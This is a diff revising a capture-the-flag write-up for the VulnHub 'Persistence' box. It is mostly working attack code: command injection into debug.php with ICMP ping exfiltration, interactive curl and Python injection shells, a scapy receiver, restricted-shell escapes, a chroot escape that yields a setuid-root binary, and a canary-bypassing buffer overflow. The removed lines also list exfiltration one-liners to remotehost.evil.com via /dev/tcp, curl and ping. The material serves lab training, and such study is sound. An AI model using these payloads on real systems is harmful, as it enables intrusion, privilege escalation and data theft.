@@ -1,29 +1,69 @@
-https://connect.ed-diamond.com/GNU-Linux-Magazine/GLMFHS-090/Scapy-le-couteau-suisse-Python-pour-le-reseau
+<https://connect.ed-diamond.com/GNU-Linux-Magazine/GLMFHS-090/Scapy-le-couteau-suisse-Python-pour-le-reseau>
+    
+<https://swappage.github.io/blog/2014/10/06/vulnhub-competition-persistence/>
 
-https://swappage.github.io/blog/2014/10/06/vulnhub-competition-persistence/
+<https://leonjza.github.io/blog/2014/09/18/from-persistence/>
 
-https://leonjza.github.io/blog/2014/09/18/from-persistence/
+<https://swappage.github.io/images/2014-10-06/persistence.pdf>
+    
+<http://devloop.users.sourceforge.net/index.php?article106/solution-du-ctf-persistence>
+    
+<https://g0blin.co.uk/persistence-vulnhub-writeup/#what-a-beautiful-shell>
+    
+<https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash>
+    
+<https://beta.hackndo.com/technique-du-canari-bypass/>
 
-https://swappage.github.io/images/2014-10-06/persistence.pdf
+<https://filippo.io/escaping-a-chroot-jail-slash-1/>
 
-http://devloop.users.sourceforge.net/index.php?article106/solution-du-ctf-persistence
+<http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html>
+    
+<https://book.hacktricks.xyz/exfiltration>
+    
 
-https://g0blin.co.uk/persistence-vulnhub-writeup/#what-a-beautiful-shell
+Keys : ping exfiltration,  escaping from limited bash (ftp, nano), escaping a chroot jail, buffer overflow, canary protection
 
-https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash
 
-https://beta.hackndo.com/technique-du-canari-bypass/
+# Scan
 
-https://filippo.io/escaping-a-chroot-jail-slash-1/
+## nmap
 
-http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html
+    └─$ sudo nmap -sT -sV -p- -A -T5 192.168.56.8
+    Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-23 11:21 CET
+    Nmap scan report for 192.168.56.8
+    Host is up (0.00041s latency).
+    Not shown: 65533 filtered tcp ports (no-response)
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 5.3 (protocol 2.0)
+    | ssh-hostkey: 
+    |   1024 f6:c7:fe:24:09:fa:dc:db:ea:7e:33:6a:f5:36:58:35 (DSA)
+    |_  2048 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54 (RSA)
+    80/tcp open  http    nginx 1.4.7
+    |_http-title: The Persistence of Memory - Salvador Dali
+    |_http-server-header: nginx/1.4.7
+    MAC Address: 08:00:27:99:21:6B (Oracle VirtualBox virtual NIC)
+    Warning: OSScan results may be unreliable because we could not find at least 1 o
+    Device type: general purpose
+    Running: Linux 2.6.X|3.X
+    OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+    OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
+    Network Distance: 1 hop
+
+    TRACEROUTE
+    HOP RTT     ADDRESS
+    1   0.41 ms 192.168.56.8
+
+    OS and Service detection performed. Please report any incorrect results at https
+    Nmap done: 1 IP address (1 host up) scanned in 60.12 seconds
+
+## nikto
 
 ```console
-└─$ nikto -h http://192.168.110.38
+└─$ nikto -h http://192.168.56.8
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
-+ Target IP:          192.168.110.38
-+ Target Hostname:    192.168.110.38
++ Target IP:          192.168.56.8
++ Target Hostname:    192.168.56.8
 + Target Port:        80
 + Start Time:         2021-07-22 18:42:11 (GMT2)
 ---------------------------------------------------------------------------
@@ -40,48 +80,44 @@ http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html
 + 1 host(s) tested
 ```
 
-```console
-sudo tcpdump host 192.168.110.38 -i vboxnet0 and icmp
-```
+
+
+# Exploit
+
+## Data exfiltration with PING
+
+
 
 ```console
-sudo tcpdump host 192.168.110.38 -i vboxnet0 and icmp -X
+localhost; echo "test" > /tmp/test; if [ $? -eq 0 ]; then ping -c 1 192.168.56.1; fi
+;id| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.1; done
+;id | base64 | xxd -ps -c 16 | while read i; do ping -c1 -s32 -p $i 192.168.56.1; done
+;id |  xxd -ps -c 16 | while read i; do ping -c1 -s32 -p $i 192.168.56.1; done
+
+; id |xxd -p -c 4 | while read line; do ping -c 1 -p $line 192.168.56.1; done
+;./sysadmin-tool --activate-service| xxd -p -c 4 | while read line; do ping -p $line -c 1 -q 192.168.56.1; done
+
 ```
 
+## Monitoring
 
 ```console
-localhost; echo "test" > /tmp/test; if [ $? -eq 0 ]; then ping -c 1 192.168.110.1; fi
-;id| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.110.1; done
-;./sysadmin-tool --activate-service| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.110.1; done
-```
 
-```py
-# recieve-icmp.py
-import socket
-import sys
-
-def recv():
-    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-    while True:
-        data, src = s.recvfrom(1508)
-        payload = data[44:60]
-        sys.stdout.write(payload.decode('utf-8'))
-
-if __name__ ##  '__main__':
-    recv()
+sudo tcpdump host 192.168.56.8 -i vboxnet0 and icmp
 
 ```
 
-```bash
-# sender
-cat test.py | xxd -p -c 16 | while read line; do echo $line; ping -p $line -c 1 -q 127.0.0.1; done
+## Script to exploit
 
-```
+
+### Sender
+
+#### curl
 
 ```bash
 #!/bin/bash
 
-HOST=192.168.110.38
+HOST=192.168.56.8
 SHELL=debug.php
 printf "$ "
 while read cmd
@@ -89,26 +125,33 @@ do
     if [[ "$cmd" ##  "exit" ]]; then
         break
     fi
-    curl -s --data-urlencode "addr=;$cmd| xxd -p -c 16 | while read line; do ping -p \$line -c 1 -q 192.168.110.1; done" http://$HOST/$SHELL | sed '1,$d'
+    curl -s --data-urlencode "addr=;$cmd| xxd -p -c 4 | while read line; do ping -p \$line -c 1 -q 192.168.56.1; done" http://$HOST/$SHELL | sed '1,$d'
     printf "$ "
 done < "/proc/${$}/fd/0"
 
 ```
+
+
+#### python
+
+
 ```python
+
+# browser.py
 #!/usr/bin/python3
 from requests import post
 import sys
 
-url='http://192.168.110.38/debug.php'
-attacker = '192.168.110.1'
+url='http://192.168.56.8/debug.php'
+attacker = '192.168.56.1'
 
 while True:
     try:
         sys.stdout.write('# ')
         command = sys.stdin.readline().strip()
-        if (command ##  "exit"):
+        if (command ==  "exit"):
             break
-        payload = "; {} | xxd -p -c 16 | while read line; do ping -c 1 -p $line {}; done".format(command,attacker)
+        payload = "; {} | xxd -p -c 4 | while read line; do ping -c 1 -p $line {}; done".format(command,attacker)
         r = post(url, data={"addr":payload})
     except KeyboardInterrupt:
         break
@@ -116,28 +159,89 @@ while True:
 
 
 
-```console
-ssh avida@192.168.110.38 # dollars
-```
-## escape jail
+### Receiver
 
-```console
-  nano -s /bin/bash
-  /bin/bash
-  ^T
+```py
 
-  ftp
-  !
-  /bin/bash
+# recieve-icmp.py
+from scapy.all import *
+#This is ippsec receiver created in the HTB machine Mischief
+def process_packet(pkt):
+    if pkt.haslayer(ICMP):
+        if pkt[ICMP].type == 0:
+            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
+            print(f"{data.decode('utf-8')}", flush=True, end="")
 
-  bash-4.1$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/avida/usr/bin
-  bash-4.1$ export SHELL=/bin/bash
+sniff(iface="vboxnet0", prn=process_packet)
 
 
 ```
 
+## Exploit
 
-## escallation root
+```bash
+python3 browser.py
+# ls -al
+# ./sysadmin-tool
+# ./sysadmin-tool --activate-service
+
+
+sudo python3 recieve-icmp.py
+Usage: sysadmin-tool --activate-service
+Service started...
+Use avida:dollars to access.
+
+
+```
+
+## Post exploit
+
+```console
+
+ssh avida@192.168.56.8 # dollars
+
+```
+### Escape jail
+
+```console
+    # with nano
+    nano -s /bin/bash
+    /bin/bash
+    ^T
+
+    # with ftp
+    ftp
+    !
+    /bin/bash
+
+    # export evironement
+    $ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/avida/usr/bin
+    $ export SHELL=/bin/bash
+
+
+```
+
+
+### Open ports
+
+    bash-4.1$ netstat -tuln
+    Active Internet connections (only servers)
+    Proto Recv-Q Send-Q Local Address               Foreign Address             State
+    tcp        0      0 0.0.0.0:3333                0.0.0.0:*                   LISTEN
+    tcp        0      0 127.0.0.1:9000              0.0.0.0:*                   LISTEN
+    tcp        0      0 0.0.0.0:80                  0.0.0.0:*                   LISTEN
+    tcp        0      0 0.0.0.0:22                  0.0.0.0:*                   LISTEN
+    tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN
+    tcp        0      0 :::22                       :::*                        LISTEN
+    tcp        0      0 ::1:25                      :::*                        LISTEN
+    udp        0      0 0.0.0.0:68                  0.0.0.0:*
+
+# Exploit sysadmin-tool
+
+
+## Code source
+
+
 ```c
 //
 // This file was generated by the Retargetable Decompiler
@@ -205,7 +309,13 @@ int main(int argc, char ** argv) {
 ```
 
 
+## Exploit chroot
+
+
+### Prepare evironement for chroot
+
 ```bash
+
 bash-4.1$ ldd /usr/sbin/chroot
         linux-gate.so.1 =>  (0xb7fff000)
         libc.so.6 => /lib/libc.so.6 (0xb7e62000)
@@ -213,37 +323,43 @@ bash-4.1$ ldd /usr/sbin/chroot
 
 bash-4.1$ cd /tmp
 bash-4.1$ mkdir /tmp/chroot
+bash-4.1$ cd /tmp/chroot
 bash-4.1$ mkdir -p $(python -c "print 'a/'*100")
-bash-4.1$ cd $(python -c "print 'a/'*100")
 bash-4.1$ mkdir bin
 bash-4.1$ cp -a /bin/bash bin/bash
 bash-4.1$ cp -a /bin/sh bin/sh
 bash-4.1$ cp -al /lib lib
 bash-4.1$ cd $(python -c "print 'a/'*100")
+
 ```
 
+###  Test path
+
 ```c
+// $ cd $(python -c "print 'a/'*100")
 // cat test.c 
-#include <stdint.h>
+// gcc test.c -o test
+
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
-#include <sys/stat.h>
-#include <unistd.h>
 
 int main() {
-        int i;
+    int i;
     for (i = 0; i < 100; i++) {
         printf("%d\n", i);
-        chdir(".."); # /tmp/chroot
+        chdir(".."); // /tmp/chroot
     }
-system("/bin/pwd");
+    system("/bin/pwd");
 }
 
 ```
+### Create a launcher
+
 ```c
 
-//cat launcher.c 
+// cat launcher.c 
+// gcc launcher.c -o /tmp/chroot/bin/launcher
+
 #include <stdio.h>
 #include <stdlib.h>
 int main() {
@@ -254,16 +370,15 @@ int main() {
 
 ```
 
-```bash
-bash-4.1$ gcc launcher.c  -o bin/launcher
-```
+### Create a "fake" sed
 
 ```c
-//cat sed.c
+// cat sed.c
+// gcc sed.c -o /tmp/chroot/bin/sed
+
+#include <sys/stat.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <sys/stat.h>
-#include <sys/unistd.h>
 
 int main() {
         setuid(0);
@@ -271,37 +386,47 @@ int main() {
         chown("/bin/launcher", 0, 0);
         chmod("/bin/launcher", S_ISUID|S_IRWXU|S_IRWXG|S_IRWXO);
 }
+
 ```
+### Exploit chroot and get root
 
 ```console
-bash-4.1$ gcc sed.c  -o bin/sed
 bash-4.1$ cd $(python -c "print 'a/'*100")
-```
-```console
+
 bash-4.1$ ls -al /tmp/chroot/bin/launcher 
 -rwxrwxr-x. 1 avida avida 4864 Jul 23 11:17 /tmp/chroot/bin/launcher
-```
-```console
+
 bash-4.1$ /nginx/usr/share/nginx/html/sysadmin-tool --activate-service
 bash-4.1$ ls -al /tmp/chroot/bin/launcher 
 -rwsrwxrwx. 1 root root 4864 Jul 23 11:17 /tmp/chroot/bin/launcher
-```
-```console
+
 bash-4.1$ /tmp/chroot/bin/launcher
 bash-4.1# id
 uid=0(root) gid=0(root) groups=0(root),500(avida) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
 ```
 
 
+## Exploit worp
 
-### worp
+### worp file
 
-port forward
+    bash-4.1$ cat /proc/sys/kernel/randomize_va_space 
+    0
+
+    bash-4.1$ ls -al /usr/local/bin/wopr
+    -rwxr-xr-x. 1 root root 7878 Apr 28  2014 /usr/local/bin/wopr
+
+    bash-4.1$ ./checksec.sh --file /usr/local/bin/wopr 
+    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+    Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /usr/local/bin/wopr
+
+### port forward
 
 ```console
-└─$ ssh -L 3333:127.0.0.1:3333 avida@192.168.110.38
+└─$ ssh -N -f -L 3333:127.0.0.1:3333 avida@192.168.56.8
 ```
-
+### 
 ```python
 import socket
 import time
@@ -390,6 +515,24 @@ int main() {
 }
 
 ```
+```c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+#include <sys/unistd.h>
+
+int main() {
+        setuid(0);
+        setgid(0);
+        chown("/tmp/launcher", 0, 0);
+        chmod("/tmp/launcher", S_ISUID|S_IRWXU|S_IRWXG|S_IRWXO);
+}
+
+
+```
+
+
 
 ```console
 bash-4.1$ gcc launcher.c -o launcher
@@ -594,31 +737,55 @@ int main(int argc, char ** argv) {
 // Detected functions: 2
 
 ```
+
+
+# Box's configuration
+
+## iptables
+
+    bash-4.1# iptables -L
+    Chain INPUT (policy DROP)
+    target     prot opt source               destination         
+    ACCEPT     icmp --  anywhere             anywhere            
+    ACCEPT     all  --  anywhere             anywhere            
+    ACCEPT     tcp  --  anywhere             anywhere            state NEW,ESTABLISHED tcp dpt:ssh 
+    ACCEPT     tcp  --  anywhere             anywhere            state NEW,ESTABLISHED tcp dpt:http 
+
+    Chain FORWARD (policy DROP)
+    target     prot opt source               destination         
+
+    Chain OUTPUT (policy DROP)
+    target     prot opt source               destination         
+    ACCEPT     icmp --  anywhere             anywhere            
+    ACCEPT     all  --  anywhere             anywhere            
+    ACCEPT     tcp  --  anywhere             anywhere            state ESTABLISHED tcp spt:ssh 
+    ACCEPT     tcp  --  anywhere             anywhere            state ESTABLISHED tcp spt:http 
+
+    bash-4.1# cat /etc/sysconfig/iptables
+    *filter
+    :INPUT DROP [0:0]
+    :FORWARD DROP [0:0]
+    :OUTPUT DROP [0:0]
+    -A INPUT -p icmp -j ACCEPT
+    -A OUTPUT -p icmp -j ACCEPT
+    -A INPUT -i lo -j ACCEPT
+    -A OUTPUT -o lo -j ACCEPT
+
+    -A INPUT -m state --state NEW,ESTABLISHED -m tcp -p tcp --dport 22 -j ACCEPT
+    -A OUTPUT -m state --state ESTABLISHED -m tcp -p tcp --sport 22 -j ACCEPT
+
+    -A INPUT -m state --state NEW,ESTABLISHED -m tcp -p tcp --dport 80 -j ACCEPT
+    -A OUTPUT -m state --state ESTABLISHED -m tcp -p tcp --sport 80 -j ACCEPT
+    COMMIT
+
+## File debug.php
+
 ```php
 <?php 
-//debug.php
+// /nginx/usr/share/nginx/html/debug.php
 if (isset($_POST["addr"]))
 {
     exec("/bin/ping -c 4 ".$_POST["addr"]);
 }
 ?>
-```
-
-
-
-
-### exfiltration
-
-
-```bash
-tar zcf - localfolder | ssh remotehost.evil.com "cd /some/path/name; tar zxpf -"
-rsync -aH localhost remotehost.evil.com:/some/path/name
-tar zcf - localfolder | curl -F "data=@-" https://remotehost.evil.com/script.php
-
-tar zcf - localfolder >/dev/tcp/remotehost.evil.com/443
-tar zcf - localfolder | xxd -p >/dev/tcp/remotehost.evil.com/443
-tar zcf - localfolder | base64 | dd conv=ebcdic >/dev/tcp/remotehost.evil.com/443
-
-tar zcf - localfolder | xxd -p -c 16 | while read line; do ping -p $line -c 1 -q remotehost.evil.com; done
-
 ```
